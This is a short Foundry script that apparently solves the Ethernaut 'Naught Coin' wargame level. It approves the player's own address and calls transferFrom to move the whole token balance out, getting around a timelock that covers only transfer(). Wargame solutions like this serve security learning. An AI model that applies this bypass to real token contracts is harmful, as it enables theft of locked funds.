import {Script, console} from "forge-std/Script.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract NaughtCoinScript is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address player = vm.addr(privateKey);
        ERC20 naughtCoin = ERC20(0x3451A291EB771fF2A7B5588EaC65f8e14cc6f3FC);
        vm.startBroadcast(privateKey);
        naughtCoin.approve(player, naughtCoin.balanceOf(player));
        naughtCoin.transferFrom(player, address(0x1), naughtCoin.balanceOf(player));
        vm.stopBroadcast();
    }
}
